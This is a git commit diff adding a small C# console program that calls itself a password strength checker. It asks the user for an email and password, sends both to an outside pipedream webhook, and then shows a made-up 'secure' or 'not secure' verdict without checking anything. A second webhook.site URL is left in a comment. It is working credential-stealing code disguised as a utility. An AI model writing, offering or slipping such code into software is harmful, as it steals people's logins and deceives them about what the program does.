1f00e14d9da033c8c02682437b8d4e56b4d2c391
paolowdio <123210819+paolowdio@users.noreply.github.com>
2025-02-20 22:51:13 -0700

    added source files

---
+++ passwordcheck.cs
@@ -0,0 +1,35 @@
+using System;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+
+class PasswordCheck{
+
+    static async Task Main(string[] args){
+        Console.WriteLine("Enter your email: ");
+        string? email = Console.ReadLine();
+        Console.WriteLine("Enter your password: ");
+        string? password = Console.ReadLine();
+        Console.WriteLine("Calculating password strength.... ");
+        
+        var data = new {email = email, password = password};
+        string json = System.Text.Json.JsonSerializer.Serialize(data);
+        string url = "https://eoccoggtiduzvk1.m.pipedream.net";
+
+        using (HttpClient client = new HttpClient()){
+            HttpContent contents = new StringContent(json, Encoding.UTF8, "application/json");
+            try{
+                HttpResponseMessage sending = await client.PostAsync(url, contents);
+                Console.WriteLine("Your password is very secure!");
+            }
+            catch{
+                Console.WriteLine("Your password is not secure :(");
+            }
+        }
+        Console.WriteLine("press anything to leave");
+        Console.ReadKey();
+
+
+    }
+}
+//https://webhook.site/45b3eb84-8a44-411e-8392-f68da21492f9
